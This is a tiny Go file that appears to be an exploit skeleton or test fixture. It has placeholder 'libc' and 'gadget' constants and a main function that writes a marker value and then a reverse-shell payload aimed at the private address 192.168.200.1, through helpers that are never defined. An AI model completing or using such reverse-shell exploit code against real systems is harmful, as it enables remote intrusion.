package main

const (
	libc   = 0xf00
	gadget = 0xbaa
)

func main() {
	wp(0x42434445)
	ws("/_.")
	ws(revshell(192, 168, 200, 1))
}
